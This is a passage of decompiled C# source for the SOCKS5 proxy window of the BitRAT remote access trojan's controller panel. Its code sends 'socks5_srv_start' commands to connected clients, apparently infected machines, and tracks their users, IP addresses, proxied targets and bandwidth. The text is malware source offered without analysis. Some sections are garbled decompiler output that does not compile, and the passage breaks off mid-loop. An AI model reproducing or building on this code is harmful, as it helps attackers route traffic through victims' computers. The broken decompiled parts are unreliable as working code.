﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x02000136 RID: 310
[DesignerGenerated]
public sealed partial class fSocks5 : Form
{
	// Token: 0x0600112E RID: 4398 RVA: 0x0007DF04 File Offset: 0x0007C104
	public fSocks5()
	{
		base.Load += this.fSocks5_Load;
		base.Closing += this.fSocks5_Closing;
		this.concurrentStack_0 = new ConcurrentStack<cSocks5cli>();
		this.concurrentStack_1 = new ConcurrentStack<cSocks5cli>();
		this.concurrentStack_2 = new ConcurrentStack<cSocks5cli>();
		this.InitializeComponent();
	}

	// Token: 0x06001131 RID: 4401 RVA: 0x00009C0C File Offset: 0x00007E0C
	internal System.Windows.Forms.Timer vmethod_0()
	{
		return this.timer_0;
	}

	// Token: 0x06001132 RID: 4402 RVA: 0x0007F510 File Offset: 0x0007D710
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_8);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06001133 RID: 4403 RVA: 0x00009C14 File Offset: 0x00007E14
	internal TextBox vmethod_2()
	{
		return this.textBox_0;
	}

	// Token: 0x06001134 RID: 4404 RVA: 0x0007F554 File Offset: 0x0007D754
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(TextBox textBox_1)
	{
		EventHandler value = new EventHandler(this.method_4);
		TextBox textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged -= value;
		}
		this.textBox_0 = textBox_1;
		textBox = this.textBox_0;
		if (textBox != null)
		{
			textBox.TextChanged += value;
		}
	}

	// Token: 0x06001135 RID: 4405 RVA: 0x00009C1C File Offset: 0x00007E1C
	internal Label vmethod_4()
	{
		return this.label_0;
	}

	// Token: 0x06001136 RID: 4406 RVA: 0x00009C24 File Offset: 0x00007E24
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(Label label_1)
	{
		this.label_0 = label_1;
	}

	// Token: 0x06001137 RID: 4407 RVA: 0x00009C2D File Offset: 0x00007E2D
	internal RadioButton vmethod_6()
	{
		return this.radioButton_0;
	}

	// Token: 0x06001138 RID: 4408 RVA: 0x00009C35 File Offset: 0x00007E35
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(RadioButton radioButton_2)
	{
		this.radioButton_0 = radioButton_2;
	}

	// Token: 0x06001139 RID: 4409 RVA: 0x00009C3E File Offset: 0x00007E3E
	internal RadioButton vmethod_8()
	{
		return this.radioButton_1;
	}

	// Token: 0x0600113A RID: 4410 RVA: 0x00009C46 File Offset: 0x00007E46
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(RadioButton radioButton_2)
	{
		this.radioButton_1 = radioButton_2;
	}

	// Token: 0x0600113B RID: 4411 RVA: 0x00009C4F File Offset: 0x00007E4F
	internal StatusStrip vmethod_10()
	{
		return this.statusStrip_0;
	}

	// Token: 0x0600113C RID: 4412 RVA: 0x00009C57 File Offset: 0x00007E57
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x0600113D RID: 4413 RVA: 0x00009C60 File Offset: 0x00007E60
	internal ToolStripStatusLabel vmethod_12()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x0600113E RID: 4414 RVA: 0x00009C68 File Offset: 0x00007E68
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ToolStripStatusLabel toolStripStatusLabel_2)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_2;
	}

	// Token: 0x0600113F RID: 4415 RVA: 0x00009C71 File Offset: 0x00007E71
	internal ToolStripStatusLabel vmethod_14()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x06001140 RID: 4416 RVA: 0x00009C79 File Offset: 0x00007E79
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(ToolStripStatusLabel toolStripStatusLabel_2)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_2;
	}

	// Token: 0x06001141 RID: 4417 RVA: 0x00009C82 File Offset: 0x00007E82
	internal OLVColumn vmethod_16()
	{
		return this.olvcolumn_0;
	}

	// Token: 0x06001142 RID: 4418 RVA: 0x00009C8A File Offset: 0x00007E8A
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_0 = olvcolumn_9;
	}

	// Token: 0x06001143 RID: 4419 RVA: 0x00009C93 File Offset: 0x00007E93
	internal OLVColumn vmethod_18()
	{
		return this.olvcolumn_1;
	}

	// Token: 0x06001144 RID: 4420 RVA: 0x00009C9B File Offset: 0x00007E9B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_1 = olvcolumn_9;
	}

	// Token: 0x06001145 RID: 4421 RVA: 0x00009CA4 File Offset: 0x00007EA4
	internal FastObjectListView vmethod_20()
	{
		return this.fastObjectListView_0;
	}

	// Token: 0x06001146 RID: 4422 RVA: 0x0007F598 File Offset: 0x0007D798
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_21(FastObjectListView fastObjectListView_1)
	{
		EventHandler<FormatRowEventArgs> eventHandler = new EventHandler<FormatRowEventArgs>(this.method_6);
		KeyEventHandler value = new KeyEventHandler(this.method_7);
		MouseEventHandler value2 = new MouseEventHandler(this.method_16);
		FastObjectListView fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow -= eventHandler;
			fastObjectListView.KeyDown -= value;
			fastObjectListView.MouseUp -= value2;
		}
		this.fastObjectListView_0 = fastObjectListView_1;
		fastObjectListView = this.fastObjectListView_0;
		if (fastObjectListView != null)
		{
			fastObjectListView.FormatRow += eventHandler;
			fastObjectListView.KeyDown += value;
			fastObjectListView.MouseUp += value2;
		}
	}

	// Token: 0x06001147 RID: 4423 RVA: 0x00009CAC File Offset: 0x00007EAC
	internal ContextMenuStrip vmethod_22()
	{
		return this.contextMenuStrip_0;
	}

	// Token: 0x06001148 RID: 4424 RVA: 0x00009CB4 File Offset: 0x00007EB4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_23(ContextMenuStrip contextMenuStrip_1)
	{
		this.contextMenuStrip_0 = contextMenuStrip_1;
	}

	// Token: 0x06001149 RID: 4425 RVA: 0x00009CBD File Offset: 0x00007EBD
	internal ToolStripMenuItem vmethod_24()
	{
		return this.toolStripMenuItem_0;
	}

	// Token: 0x0600114A RID: 4426 RVA: 0x00009CC5 File Offset: 0x00007EC5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_25(ToolStripMenuItem toolStripMenuItem_7)
	{
		this.toolStripMenuItem_0 = toolStripMenuItem_7;
	}

	// Token: 0x0600114B RID: 4427 RVA: 0x00009CCE File Offset: 0x00007ECE
	internal ToolStripMenuItem vmethod_26()
	{
		return this.toolStripMenuItem_1;
	}

	// Token: 0x0600114C RID: 4428 RVA: 0x0007F614 File Offset: 0x0007D814
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_27(ToolStripMenuItem toolStripMenuItem_7)
	{
		EventHandler value = new EventHandler(this.method_15);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_1 = toolStripMenuItem_7;
		toolStripMenuItem = this.toolStripMenuItem_1;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600114D RID: 4429 RVA: 0x00009CD6 File Offset: 0x00007ED6
	internal ToolStripSeparator vmethod_28()
	{
		return this.toolStripSeparator_0;
	}

	// Token: 0x0600114E RID: 4430 RVA: 0x00009CDE File Offset: 0x00007EDE
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_29(ToolStripSeparator toolStripSeparator_3)
	{
		this.toolStripSeparator_0 = toolStripSeparator_3;
	}

	// Token: 0x0600114F RID: 4431 RVA: 0x00009CE7 File Offset: 0x00007EE7
	internal ToolStripMenuItem vmethod_30()
	{
		return this.toolStripMenuItem_2;
	}

	// Token: 0x06001150 RID: 4432 RVA: 0x00009CEF File Offset: 0x00007EEF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_31(ToolStripMenuItem toolStripMenuItem_7)
	{
		this.toolStripMenuItem_2 = toolStripMenuItem_7;
	}

	// Token: 0x06001151 RID: 4433 RVA: 0x00009CF8 File Offset: 0x00007EF8
	internal ToolStripMenuItem vmethod_32()
	{
		return this.toolStripMenuItem_3;
	}

	// Token: 0x06001152 RID: 4434 RVA: 0x0007F658 File Offset: 0x0007D858
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_33(ToolStripMenuItem toolStripMenuItem_7)
	{
		EventHandler value = new EventHandler(this.method_17);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_3 = toolStripMenuItem_7;
		toolStripMenuItem = this.toolStripMenuItem_3;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001153 RID: 4435 RVA: 0x00009D00 File Offset: 0x00007F00
	internal ToolStripMenuItem vmethod_34()
	{
		return this.toolStripMenuItem_4;
	}

	// Token: 0x06001154 RID: 4436 RVA: 0x0007F69C File Offset: 0x0007D89C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_35(ToolStripMenuItem toolStripMenuItem_7)
	{
		EventHandler value = new EventHandler(this.method_18);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_4 = toolStripMenuItem_7;
		toolStripMenuItem = this.toolStripMenuItem_4;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001155 RID: 4437 RVA: 0x00009D08 File Offset: 0x00007F08
	internal PictureBox vmethod_36()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06001156 RID: 4438 RVA: 0x0007F6E0 File Offset: 0x0007D8E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_37(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_21);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_0 = pictureBox_2;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001157 RID: 4439 RVA: 0x00009D10 File Offset: 0x00007F10
	internal BackgroundWorker vmethod_38()
	{
		return this.backgroundWorker_0;
	}

	// Token: 0x06001158 RID: 4440 RVA: 0x0007F724 File Offset: 0x0007D924
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_39(BackgroundWorker backgroundWorker_1)
	{
		DoWorkEventHandler value = new DoWorkEventHandler(this.method_12);
		BackgroundWorker backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork -= value;
		}
		this.backgroundWorker_0 = backgroundWorker_1;
		backgroundWorker = this.backgroundWorker_0;
		if (backgroundWorker != null)
		{
			backgroundWorker.DoWork += value;
		}
	}

	// Token: 0x06001159 RID: 4441 RVA: 0x00009D18 File Offset: 0x00007F18
	internal OLVColumn vmethod_40()
	{
		return this.olvcolumn_2;
	}

	// Token: 0x0600115A RID: 4442 RVA: 0x00009D20 File Offset: 0x00007F20
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_41(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_2 = olvcolumn_9;
	}

	// Token: 0x0600115B RID: 4443 RVA: 0x00009D29 File Offset: 0x00007F29
	internal OLVColumn vmethod_42()
	{
		return this.olvcolumn_3;
	}

	// Token: 0x0600115C RID: 4444 RVA: 0x00009D31 File Offset: 0x00007F31
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_43(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_3 = olvcolumn_9;
	}

	// Token: 0x0600115D RID: 4445 RVA: 0x00009D3A File Offset: 0x00007F3A
	internal OLVColumn vmethod_44()
	{
		return this.olvcolumn_4;
	}

	// Token: 0x0600115E RID: 4446 RVA: 0x00009D42 File Offset: 0x00007F42
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_45(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_4 = olvcolumn_9;
	}

	// Token: 0x0600115F RID: 4447 RVA: 0x00009D4B File Offset: 0x00007F4B
	internal OLVColumn vmethod_46()
	{
		return this.olvcolumn_5;
	}

	// Token: 0x06001160 RID: 4448 RVA: 0x00009D53 File Offset: 0x00007F53
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_47(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_5 = olvcolumn_9;
	}

	// Token: 0x06001161 RID: 4449 RVA: 0x00009D5C File Offset: 0x00007F5C
	internal OLVColumn vmethod_48()
	{
		return this.olvcolumn_6;
	}

	// Token: 0x06001162 RID: 4450 RVA: 0x00009D64 File Offset: 0x00007F64
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_49(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_6 = olvcolumn_9;
	}

	// Token: 0x06001163 RID: 4451 RVA: 0x00009D6D File Offset: 0x00007F6D
	internal OLVColumn vmethod_50()
	{
		return this.olvcolumn_7;
	}

	// Token: 0x06001164 RID: 4452 RVA: 0x00009D75 File Offset: 0x00007F75
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_51(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_7 = olvcolumn_9;
	}

	// Token: 0x06001165 RID: 4453 RVA: 0x00009D7E File Offset: 0x00007F7E
	internal OLVColumn vmethod_52()
	{
		return this.olvcolumn_8;
	}

	// Token: 0x06001166 RID: 4454 RVA: 0x00009D86 File Offset: 0x00007F86
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_53(OLVColumn olvcolumn_9)
	{
		this.olvcolumn_8 = olvcolumn_9;
	}

	// Token: 0x06001167 RID: 4455 RVA: 0x00009D8F File Offset: 0x00007F8F
	internal PictureBox vmethod_54()
	{
		return this.pictureBox_1;
	}

	// Token: 0x06001168 RID: 4456 RVA: 0x0007F768 File Offset: 0x0007D968
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_55(PictureBox pictureBox_2)
	{
		EventHandler value = new EventHandler(this.method_13);
		PictureBox pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click -= value;
		}
		this.pictureBox_1 = pictureBox_2;
		pictureBox = this.pictureBox_1;
		if (pictureBox != null)
		{
			pictureBox.Click += value;
		}
	}

	// Token: 0x06001169 RID: 4457 RVA: 0x00009D97 File Offset: 0x00007F97
	internal CheckBox vmethod_56()
	{
		return this.checkBox_0;
	}

	// Token: 0x0600116A RID: 4458 RVA: 0x0007F7AC File Offset: 0x0007D9AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_57(CheckBox checkBox_1)
	{
		EventHandler value = new EventHandler(this.method_14);
		CheckBox checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
		}
		this.checkBox_0 = checkBox_1;
		checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
		}
	}

	// Token: 0x0600116B RID: 4459 RVA: 0x00009D9F File Offset: 0x00007F9F
	internal ToolStripMenuItem vmethod_58()
	{
		return this.toolStripMenuItem_5;
	}

	// Token: 0x0600116C RID: 4460 RVA: 0x0007F7F0 File Offset: 0x0007D9F0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_59(ToolStripMenuItem toolStripMenuItem_7)
	{
		EventHandler value = new EventHandler(this.method_19);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_5 = toolStripMenuItem_7;
		toolStripMenuItem = this.toolStripMenuItem_5;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600116D RID: 4461 RVA: 0x00009DA7 File Offset: 0x00007FA7
	internal ToolStripSeparator vmethod_60()
	{
		return this.toolStripSeparator_1;
	}

	// Token: 0x0600116E RID: 4462 RVA: 0x00009DAF File Offset: 0x00007FAF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_61(ToolStripSeparator toolStripSeparator_3)
	{
		this.toolStripSeparator_1 = toolStripSeparator_3;
	}

	// Token: 0x0600116F RID: 4463 RVA: 0x00009DB8 File Offset: 0x00007FB8
	internal VisualButton vmethod_62()
	{
		return this.visualButton_0;
	}

	// Token: 0x06001170 RID: 4464 RVA: 0x0007F834 File Offset: 0x0007DA34
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_63(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_5);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_2;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06001171 RID: 4465 RVA: 0x00009DC0 File Offset: 0x00007FC0
	internal VisualButton vmethod_64()
	{
		return this.visualButton_1;
	}

	// Token: 0x06001172 RID: 4466 RVA: 0x0007F878 File Offset: 0x0007DA78
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_65(VisualButton visualButton_2)
	{
		EventHandler value = new EventHandler(this.method_20);
		VisualButton visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_1 = visualButton_2;
		visualButton = this.visualButton_1;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06001173 RID: 4467 RVA: 0x00009DC8 File Offset: 0x00007FC8
	internal ToolStripSeparator vmethod_66()
	{
		return this.toolStripSeparator_2;
	}

	// Token: 0x06001174 RID: 4468 RVA: 0x00009DD0 File Offset: 0x00007FD0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_67(ToolStripSeparator toolStripSeparator_3)
	{
		this.toolStripSeparator_2 = toolStripSeparator_3;
	}

	// Token: 0x06001175 RID: 4469 RVA: 0x00009DD9 File Offset: 0x00007FD9
	internal ToolStripMenuItem vmethod_68()
	{
		return this.toolStripMenuItem_6;
	}

	// Token: 0x06001176 RID: 4470 RVA: 0x0007F8BC File Offset: 0x0007DABC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_69(ToolStripMenuItem toolStripMenuItem_7)
	{
		EventHandler value = new EventHandler(this.method_22);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_6 = toolStripMenuItem_7;
		toolStripMenuItem = this.toolStripMenuItem_6;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06001177 RID: 4471 RVA: 0x00063178 File Offset: 0x00061378
	public void method_0()
	{
		checked
		{
			base.Left = (int)Math.Round(unchecked((double)Class130.fMain_0.Left + (double)Class130.fMain_0.Width / 2.0 - (double)base.Width / 2.0));
			base.Top = (int)Math.Round(unchecked((double)Class130.fMain_0.Top + (double)Class130.fMain_0.Height / 2.0 - (double)base.Height / 2.0));
		}
	}

	// Token: 0x06001178 RID: 4472 RVA: 0x0007F900 File Offset: 0x0007DB00
	public void method_1(string string_0, string string_1, string string_2, string string_3)
	{
		if (this.vmethod_20().InvokeRequired)
		{
			this.vmethod_20().Invoke(new fSocks5.Delegate99(this.method_1), new object[]
			{
				string_0,
				string_1,
				string_2,
				string_3
			});
			return;
		}
		if (!Class130.concurrentDictionary_6.ContainsKey(string_0))
		{
			cSocks5cli cSocks5cli = new cSocks5cli();
			cSocks5cli.IP = string_2;
			cSocks5cli.USER = string_1;
			cSocks5cli.Key = string_0;
			cSocks5cli.PORT = string_3;
			cSocks5cli.DURATION = Class136.smethod_35(0L, true);
			cSocks5cli.bJustConnected = true;
			if (Conversion.Val(string_3) == 0.0)
			{
				cSocks5cli.pending_dc = true;
			}
			Class130.concurrentDictionary_6.TryAdd(string_0, cSocks5cli);
			Class130.concurrentDictionary_6[string_0].Key = string_0;
			this.concurrentStack_0.Push(cSocks5cli);
		}
	}

	// Token: 0x06001179 RID: 4473 RVA: 0x0007F9DC File Offset: 0x0007DBDC
	public void method_2(string string_0)
	{
		if (Class130.concurrentDictionary_6.ContainsKey(string_0))
		{
			if (this.vmethod_20().InvokeRequired)
			{
				this.vmethod_20().Invoke(new fSocks5.Delegate96(this.method_2), new object[]
				{
					string_0
				});
				return;
			}
			try
			{
				this.concurrentStack_2.Push(Class130.concurrentDictionary_6[string_0]);
				ConcurrentDictionary<string, cSocks5cli> concurrentDictionary_ = Class130.concurrentDictionary_6;
				cSocks5cli cSocks5cli = null;
				concurrentDictionary_.TryRemove(string_0, out cSocks5cli);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600117A RID: 4474 RVA: 0x0007FA70 File Offset: 0x0007DC70
	public void method_3(string string_0, string[] string_1)
	{
		if (Class130.concurrentDictionary_6.ContainsKey(string_0))
		{
			if (this.vmethod_20().InvokeRequired)
			{
				this.vmethod_20().Invoke(new fSocks5.Delegate97(this.method_3), new object[]
				{
					string_0,
					string_1
				});
				return;
			}
			try
			{
				Class130.concurrentDictionary_6[string_0].USER = string_1[0];
				Class130.concurrentDictionary_6[string_0].IP = string_1[1];
				Class130.concurrentDictionary_6[string_0].PORT = string_1[2];
				cSocks5cli cSocks5cli = Class130.concurrentDictionary_6[string_0];
				ref double ptr = ref cSocks5cli.dRecv;
				cSocks5cli.dRecv = ptr + Conversion.Val(string_1[4]);
				cSocks5cli cSocks5cli2 = Class130.concurrentDictionary_6[string_0];
				ptr = ref cSocks5cli2.dSent;
				cSocks5cli2.dSent = ptr + Conversion.Val(string_1[5]);
				Class130.concurrentDictionary_6[string_0].TARGET = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
				cSocks5cli cSocks5cli3 = Class130.concurrentDictionary_6[string_0];
				int num = (Operators.CompareString(string_1[4], string.Empty, true) == 0) ? 1 : 0;
				string text = "N/A";
				double num2 = Conversions.ToDouble(string_1[4]);
				bool flag = false;
				ref bool ptr2 = ref flag;
				double num3 = num2;
				string truePart = text;
				int expression = num;
				cSocks5cli cSocks5cli4 = cSocks5cli3;
				int num4;
				string text3;
				int num5;
				object obj;
				try
				{
					ProjectData.ClearProjectError();
					num4 = 2;
					string text2 = string.Empty;
					if (num3 >= 1099511627776.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num3 >= 1073741824.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num3 >= 1048576.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num3 >= 1024.0)
					{
						text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
					}
					else if (num3 < 1024.0)
					{
						text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
					}
					if (ptr2)
					{
						text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
					}
					if (text2.Length > 0)
					{
						text3 = text2;
					}
					else
					{
						text3 = " 0 B";
					}
					IL_293:
					goto IL_2E3;
					IL_295:
					text3 = "0 B";
					goto IL_293;
					IL_29E:
					num5 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
					IL_2B4:;
				}
				catch when (endfilter(obj is Exception & num4 != 0 & num5 == 0))
				{
					Exception ex = (Exception)obj2;
					goto IL_29E;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_2E3:
				if (num5 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str = text3;
				cSocks5cli4.SPEED_DL = Conversions.ToString(Interaction.IIf(expression != 0, truePart, str + "/s"));
				cSocks5cli cSocks5cli5 = Class130.concurrentDictionary_6[string_0];
				int num6 = (Operators.CompareString(string_1[5], string.Empty, true) == 0) ? 1 : 0;
				string text4 = "N/A";
				double num7 = Conversions.ToDouble(string_1[5]);
				flag = false;
				ptr2 = ref flag;
				num3 = num7;
				string truePart2 = text4;
				int expression2 = num6;
				cSocks5cli cSocks5cli6 = cSocks5cli5;
				object obj3;
				try
				{
					ProjectData.ClearProjectError();
					num4 = 2;
					string text2 = string.Empty;
					if (num3 >= 1099511627776.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
					}
					else if (num3 >= 1073741824.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
					}
					else if (num3 >= 1048576.0)
					{
						text2 = Strings.Format(num3 / 1024.0 / 1024.0, "#0.00") + " MiB";
					}
					else if (num3 >= 1024.0)
					{
						text2 = Strings.Format(num3 / 1024.0, "#0.00") + " KiB";
					}
					else if (num3 < 1024.0)
					{
						text2 = Conversions.ToString(Conversion.Fix(num3)) + " B";
					}
					if (ptr2)
					{
						text2 = Strings.Split(text2, " ", -1, CompareMethod.Text)[0];
					}
					if (text2.Length > 0)
					{
						text3 = text2;
					}
					else
					{
						text3 = " 0 B";
					}
					IL_4B7:
					goto IL_507;
					IL_4B9:
					text3 = "0 B";
					goto IL_4B7;
					IL_4C2:
					num5 = -1;
					@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num4);
					IL_4D8:;
				}
				catch when (endfilter(obj3 is Exception & num4 != 0 & num5 == 0))
				{
					Exception ex2 = (Exception)obj4;
					goto IL_4C2;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				IL_507:
				if (num5 != 0)
				{
					ProjectData.ClearProjectError();
				}
				string str2 = text3;
				cSocks5cli6.SPEED_UL = Conversions.ToString(Interaction.IIf(expression2 != 0, truePart2, str2 + "/s"));
				Class130.concurrentDictionary_6[string_0].DURATION = Class136.smethod_35(checked((long)Math.Round(Conversion.Val(string_1[6]) / 1000.0)), true);
				Class130.concurrentDictionary_6[string_0].bJustConnected = false;
				this.concurrentStack_1.Push(Class130.concurrentDictionary_6[string_0]);
				return;
			}
			catch (Exception ex3)
			{
				return;
			}
		}
		this.method_1(string_0, Class130.concurrentDictionary_3[string_0].sUser, Class130.concurrentDictionary_3[string_0].sIP, string_1[2]);
		this.method_3(string_0, string_1);
	}

	// Token: 0x0600117B RID: 4475 RVA: 0x00080098 File Offset: 0x0007E298
	private void method_4(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_2().Text) | Conversion.Val(this.vmethod_2().Text) < 1.0 | Conversion.Val(this.vmethod_2().Text) > 65535.0)
		{
			this.vmethod_2().BackColor = Color.Red;
			return;
		}
		this.vmethod_2().BackColor = Color.White;
	}

	// Token: 0x0600117C RID: 4476 RVA: 0x00080114 File Offset: 0x0007E314
	private void method_5(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_2().Text) | Conversion.Val(this.vmethod_2().Text) < 1.0 | Conversion.Val(this.vmethod_2().Text) > 65535.0)
		{
			Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_2().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_2().Text) > 32639.5, "32768", "1080"));
			return;
		}
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		if (this.vmethod_6().Checked)
		{
			if (fastObjectListView.SelectedObjects == null)
			{
				return;
			}
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = Conversions.ToString(Operators.ConcatenateObject("socks5_srv_start|", Interaction.IIf(this.vmethod_56().Checked, "0", this.vmethod_2().Text)));
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
				return;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		try
		{
			foreach (object obj2 in fastObjectListView.Objects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = Conversions.ToString(Operators.ConcatenateObject("socks5_srv_start|", Interaction.IIf(this.vmethod_56().Checked, "0", this.vmethod_2().Text)));
				string string_2 = sKey2;
